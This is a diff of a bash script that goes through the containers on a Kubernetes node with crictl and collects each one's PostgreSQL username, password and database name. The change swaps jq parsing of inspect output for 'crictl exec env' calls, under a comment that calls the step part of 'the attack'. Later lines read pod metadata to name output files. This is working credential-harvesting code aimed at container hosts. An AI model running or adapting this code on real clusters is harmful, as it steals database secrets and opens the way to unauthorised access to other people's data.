@@ -28,7 +28,7 @@ if [[ ${#CIDS[@]} -eq 0 ]]; then
   exit 0
 fi
 
-echo "Found ${#CIDS[@]} containers. Running query…"
+echo "Found ${#CIDS[@]} containers. Running query..."
 for CID in "${CIDS[@]}"; do
   # Extract env and metadata from container (protected)
   if ! INSPECT_JSON=$(crictl inspect "$CID"); then
@@ -36,13 +36,10 @@ for CID in "${CIDS[@]}"; do
     continue
   fi
 
-  # Converts array envs in objects key->value and takes the three variables
-  read -r USER DB PASS < <(printf '%s' "$INSPECT_JSON" \
-    | jq -r '
-      .info.config.envs
-      | (map({(.key): .value}) | add) as $e
-      | "\($e.POSTGRES_USER) \($e.POSTGRES_DB) \($e.POSTGRES_PASSWORD)"
-    ')
+  # Extract DB credentials from env variables to proceed the attack
+  USER=$(crictl exec "$CID" env | awk -F= '$1=="POSTGRES_USER"{print $2}')
+  PASS=$(crictl exec "$CID" env | awk -F= '$1=="POSTGRES_PASSWORD"{print $2}')
+  DB=$(crictl exec "$CID" env | awk -F= '$1=="POSTGRES_DB"{print $2}')
 
   # Metadata for filename
   NS=$(printf '%s' "$INSPECT_JSON" | jq -r '.status.labels["io.kubernetes.pod.namespace"] // "default"')
